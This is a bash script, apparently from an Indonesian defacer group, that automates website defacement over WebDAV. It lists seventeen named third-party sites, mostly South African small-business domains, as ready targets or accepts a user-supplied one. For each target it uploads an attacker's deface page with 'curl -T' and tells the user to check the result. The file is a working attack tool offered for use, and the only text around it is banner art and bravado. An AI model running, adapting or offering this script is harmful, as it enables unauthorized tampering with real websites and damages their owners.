#!/bin/bash

#CodedBy shantree.cyberteam
#WEBDAVdeface
#JanganDiRecodeYaGayn:)
#let'go cekidot :)

clear
bi='\033[34;1m' #biru
i='\033[32;1m' #ijo
pur='\033[35;1m' #purple
cy='\033[36;1m' #cyan
me='\033[31;1m' #merah
pu='\033[37;1m' #putih
ku='\033[33;1m' #kuning

clear
cd 
figlet -f pagga WEBDAV DEFACE | lolcat
      
      echo""
      echo $bi"  _____________________"
      echo $bi" /                    /"$bi"|" $me" contacts: 0878-9187-****"
      echo $bi"/____________________/"$bi" |" $pu" ========================"
      echo $bi"|" $ku"•Author: XXXX•" $bi"|" $bi"|" $me" Me : days"
      echo $bi"|====================|"$bi" |" $pu" ========================"
      echo $bi"|" $ku"Thanks To Lin uX_ID"$bi"|"$bi" |" $me" FB : bal bal "
      echo $bi"|________|°|°|_______|"$bi"/" $pu"  ========================"
      echo ""
      echo $me"              ["$ku"-"$me"]"$cy"WEBDAV DEFACE"$me"["$ku"-"$me"]"
echo ""
echo $ku "*note:"
echo $me"|========================================|"
echo $me"|"$i" WHAT ARE YOU DOING ?"$me"|"
echo $me"|"$i" DONT TOUCH ME FOR DEFACER!"  $me "|"
echo $me"|========================================|"
echo ""
echo -n $ku"Nama Script Deface? : " 
read sc
echo ""
###################################################
# CTRL + C
###################################################
trap ctrl_c INT
ctrl_c() {
clear
echo $"CTRL+C Detected😢, Trying To Exit" | lolcat
echo ""
echo $" Byee, see you goblook 😗" | lolcat
sleep 2
exit
}

lagi=1
while [ $lagi -lt 6 ];
do
echo $me"["$ku"1"$me"]" $pu"Dont Have Target";
echo $me"[============"$pu"=============]"
echo $me"["$ku"2"$me"]" $pu"Have Target";
echo ""
echo    "╭─Choose : " |lolcat
read -p "╰─#" pil;

case $pil in
1)echo ""
echo $pu"List Target : "
echo $pu"==========================="
echo $me"
http://contsol.co.za
http://colourfactory.co.za
http://scnc.co.za
http://windmillsandporcupines.co.za
http://cblandscapes.co.z
http://naturaleyeimages.com
http://bitsandpieces.co.za
http://infussion.co.za
http://thepremiummakers.com
http://mocosi.co.za
http://itsengineering.co.za
http://handj.co.za
http://ayk.co.za
http://holotropicbreathwork.co.za
http://foodconsult.co.za
http://daretogowildafrica.co.za
http://hybriddevelopments.co.za

"

echo ""
echo $pu"==========================="
echo -n $i"Choose  : " 
read tg
echo ""
echo -n $i"Target $tg !" $cy"Enter for start!"
read trgt
curl -T $sc $tg
echo ""
echo ""
echo $me"========================================"
echo $ku"Please Check This Site $cy $tg/$sc" 
echo $me"========================================"

exit

;;


2)echo -n $i"Write Target : " 
read tg
echo ""
echo -n $i"Target $tg !" $cy"Enter for start!"
read trgt
curl -T $sc $tg
echo ""
echo ""
echo $me"========================================"
echo $ku"Check This Site $cy $tg/$sc" 
echo $me"========================================"

exit

;;


*) echo " search any more! " | lolcat
esac
done
done
